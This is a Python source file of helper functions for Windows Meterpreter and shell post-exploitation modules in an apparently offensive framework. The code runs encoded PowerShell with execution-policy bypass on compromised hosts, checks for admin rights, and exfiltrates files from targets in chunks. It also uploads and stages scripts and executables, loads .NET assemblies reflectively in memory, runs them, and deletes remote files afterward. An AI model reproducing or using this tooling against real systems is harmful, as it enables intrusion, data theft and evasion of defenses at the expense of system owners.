#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic helpers for Windows shell / Meterpreter post modules."""

from __future__ import annotations

import base64
import os
import re
from typing import Optional

from core.framework.enums import SessionType
from core.output_handler import print_error, print_status, print_warning

KS_FILE_MARKER = "__KS_FILE__:"


class WindowsSessionMixin:
    """Mixin for Post modules — expects cmd_execute, session_id, framework."""

    def _win_sid(self) -> str:
        return str(getattr(self, "session_id", "") or "").strip()

    def _win_meterpreter(self) -> bool:
        sid = self._win_sid()
        if not sid or not getattr(self, "framework", None):
            return False
        sm = getattr(self.framework, "session_manager", None)
        if not sm:
            return False
        session = sm.get_session(sid)
        if not session:
            return False
        st = (getattr(session, "session_type", "") or "").lower()
        return st == SessionType.METERPRETER.value.lower()

    def win_execute(self, command: str, timeout: int = 15, *, wrap_job: bool = True) -> str:
        if not command:
            return ""
        if self._win_meterpreter() and not command.lstrip().lower().startswith("shell "):
            command = f"shell {command}"
        if wrap_job and timeout > 0 and not command.lstrip().lower().startswith("powershell -encodedcommand"):
            command = (
                f'powershell -Command "$job = Start-Job -ScriptBlock {{ {command} }}; '
                f'if (Wait-Job $job -Timeout {timeout}) {{ Receive-Job $job }} '
                f'else {{ Stop-Job $job; Remove-Job $job; Write-Output \\"TIMEOUT\\" }}"'
            )
        try:
            output = (self.cmd_execute(command) or "").strip()
            if "TIMEOUT" in output:
                print_warning(f"Command timed out after {timeout}s")
                return ""
            return output
        except Exception as exc:
            print_warning(f"Command failed: {exc}")
            return ""

    @staticmethod
    def win_encode_powershell(script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def win_run_powershell(self, script: str, *, timeout: int = 30) -> str:
        encoded = self.win_encode_powershell(script)
        return self.win_execute(
            f"powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand {encoded}",
            timeout=timeout,
            wrap_job=False,
        )

    @staticmethod
    def win_ps_single_quote(value: str) -> str:
        return str(value).replace("'", "''")

    def win_remote_temp_dir(self, option_name: str = "out_dir") -> str:
        opt = getattr(self, option_name, None)
        val = opt.value if hasattr(opt, "value") else opt
        if str(val or "").strip():
            return str(val).strip().rstrip("\\")
        output = self.win_execute("echo %TEMP%", timeout=5)
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def win_require_windows(self) -> bool:
        if not self._win_sid():
            print_error("Session ID is required.")
            return False
        if "Windows_NT" not in self.win_execute("echo %OS%", timeout=5):
            print_error("Windows session required.")
            return False
        return True

    def win_is_admin(self) -> bool:
        if "OK" in self.win_execute("net session >nul 2>&1 && echo OK || echo NO", timeout=5):
            return True
        ps = (
            'powershell -Command "$p = New-Object Security.Principal.WindowsPrincipal('
            "[Security.Principal.WindowsIdentity]::GetCurrent()); "
            'if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) '
            '{ Write-Output \\"ADMIN\\" } else { Write-Output \\"USER\\" }"'
        )
        return "ADMIN" in self.win_execute(ps, timeout=8)

    def win_require_powershell(self) -> bool:
        out = self.win_execute('powershell -NoP -Command "Write-Output 1"', timeout=8)
        if "1" not in out:
            print_error("PowerShell is not available on the target.")
            return False
        return True

    @staticmethod
    def win_parse_file_marker(output: str, marker: str = KS_FILE_MARKER) -> str:
        for line in (output or "").splitlines():
            line = line.strip()
            if line.startswith(marker):
                return line[len(marker):].strip()
        return ""

    def win_remote_file_size(self, path: str) -> int:
        pq = self.win_ps_single_quote(path)
        out = self.win_run_powershell(f"(Get-Item -LiteralPath '{pq}').Length", timeout=10).strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def win_read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self.win_ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self.win_run_powershell(ps, timeout=30)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def win_pull_file_via_session(
        self,
        remote_path: str,
        local_path: str,
        *,
        chunk_kb: int = 512,
    ) -> bool:
        size = self.win_remote_file_size(remote_path)
        if size <= 0:
            print_error(f"Remote file is missing or empty: {remote_path}")
            return False

        print_status(f"Downloading {size} bytes...")
        chunk = max(1024, int(chunk_kb) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self.win_read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset}.")
                return False
            parts.append(blob)
            offset += n
            if size > chunk:
                pct = int((offset * 100) / size)
                print_status(f"Download progress: {pct}%")

        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as handle:
            handle.write(b"".join(parts))
        return True

    def win_run_dotnet_assembly(
        self,
        assembly_path: str,
        *,
        type_name: str = "",
        method_name: str = "Main",
        arguments: str = "",
    ) -> str:
        pq = self.win_ps_single_quote(assembly_path)
        tn = self.win_ps_single_quote(type_name) if type_name else ""
        mn = self.win_ps_single_quote(method_name)
        args_ps = self.win_ps_single_quote(arguments)
        resolve_type = (
            f"$type = $asm.GetType('{tn}')"
            if tn
            else "$type = $asm.GetTypes() | Where-Object { $_.GetMethod('Main', [typeof(string[])]) } | Select-Object -First 1"
        )
        script = f"""
$ErrorActionPreference = 'Stop'
$path = '{pq}'
$bytes = [IO.File]::ReadAllBytes($path)
$asm = [Reflection.Assembly]::Load($bytes)
{resolve_type}
if (-not $type) {{ throw 'Type not found' }}
$main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static')
if (-not $main) {{ throw 'Method not found' }}
$argLine = '{args_ps}'
$args = if ($argLine) {{ ,@($argLine -split ' ') }} else {{ ,@([string[]]@()) }}
$main.Invoke($null, $args) | Out-String -Width 4096
"""
        return self.win_run_powershell(script, timeout=60)

    def win_write_remote_b64_text(
        self,
        b64_payload: str,
        remote_path: str,
        *,
        chunk_size: int = 3500,
    ) -> None:
        """Write a base64 text blob to a remote path in append-safe chunks."""
        path_q = self.win_ps_single_quote(remote_path)
        chunks = [b64_payload[i:i + chunk_size] for i in range(0, len(b64_payload), chunk_size)]
        for index, chunk in enumerate(chunks):
            chunk_q = self.win_ps_single_quote(chunk)
            method = "WriteAllText" if index == 0 else "AppendAllText"
            self.win_run_powershell(
                f"[IO.File]::{method}('{path_q}','{chunk_q}');",
                timeout=15,
            )

    def win_write_remote_script(
        self,
        content: str,
        remote_dir: str,
        base_name: str,
        *,
        encoding: str = "utf-8",
        extension: str = ".ps1",
    ) -> tuple[str, str]:
        """Upload a script via base64 staging (returns script path, blob path)."""
        script_path = f"{remote_dir.rstrip('\\')}\\{base_name}{extension}"
        blob_path = f"{remote_dir.rstrip('\\')}\\{base_name}.b64"
        payload = base64.b64encode(content.encode(encoding)).decode("ascii")
        self.win_write_remote_b64_text(payload, blob_path)
        blob_q = self.win_ps_single_quote(blob_path)
        script_q = self.win_ps_single_quote(script_path)
        self.win_run_powershell(
            f"$b=[IO.File]::ReadAllText('{blob_q}');"
            f"[IO.File]::WriteAllText('{script_q}',"
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));",
            timeout=20,
        )
        return script_path, blob_path

    def win_write_remote_bytes(
        self,
        data: bytes,
        remote_path: str,
        *,
        chunk_kb: int = 256,
    ) -> bool:
        """Upload raw bytes to a remote file through the session."""
        if not data:
            print_error("Cannot upload empty payload.")
            return False

        path_q = self.win_ps_single_quote(remote_path)
        chunk = max(1024, int(chunk_kb) * 1024)
        offset = 0
        size = len(data)
        while offset < size:
            piece = data[offset:offset + chunk]
            b64 = base64.b64encode(piece).decode("ascii")
            b64_q = self.win_ps_single_quote(b64)
            mode = "Create" if offset == 0 else "Append"
            self.win_run_powershell(
                f"$b=[Convert]::FromBase64String('{b64_q}');"
                f"$fs=[IO.File]::Open('{path_q}',[IO.FileMode]::{mode});"
                f"$fs.Write($b,0,$b.Length);$fs.Close();",
                timeout=30,
            )
            offset += len(piece)
            if size > chunk:
                pct = int((offset * 100) / size)
                print_status(f"Upload progress: {pct}%")

        return self.win_remote_file_size(remote_path) == size

    def win_upload_file(
        self,
        local_path: str,
        remote_path: str,
        *,
        chunk_kb: int = 256,
    ) -> bool:
        """Upload a local file to the target through the session."""
        if not os.path.isfile(local_path):
            print_error(f"Local file not found: {local_path}")
            return False
        with open(local_path, "rb") as handle:
            data = handle.read()
        print_status(f"Uploading {len(data)} bytes to {remote_path}...")
        return self.win_write_remote_bytes(data, remote_path, chunk_kb=chunk_kb)

    def win_read_remote_text(self, remote_path: str, *, timeout: int = 30) -> str:
        return self.win_execute(f'type "{remote_path}"', timeout=timeout, wrap_job=False)

    def win_remote_file_exists(self, remote_path: str) -> bool:
        out = self.win_execute(
            f'if exist "{remote_path}" (echo OK) else (echo MISSING)',
            timeout=8,
            wrap_job=False,
        )
        return "OK" in out

    def win_run_remote_executable(
        self,
        remote_path: str,
        arguments: str = "",
        *,
        timeout: int = 60,
    ) -> str:
        cmd = f'"{remote_path}"'
        args = str(arguments or "").strip()
        if args:
            cmd = f"{cmd} {args}"
        return self.win_execute(cmd, timeout=timeout)

    def win_delete_remote(self, paths) -> None:
        for path in paths:
            if path:
                self.win_execute(f'del /f /q "{path}"', timeout=8, wrap_job=False)

    @staticmethod
    def win_powershell_cli_prefix(*, no_profile: bool = True, non_interactive: bool = True) -> str:
        parts = ["powershell"]
        if no_profile:
            parts.append("-NoProfile")
        if non_interactive:
            parts.append("-NonInteractive")
        parts.extend(["-ExecutionPolicy", "Bypass"])
        return " ".join(parts)

    @staticmethod
    def win_int_opt(val, default: int, minimum: Optional[int] = None) -> int:
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n
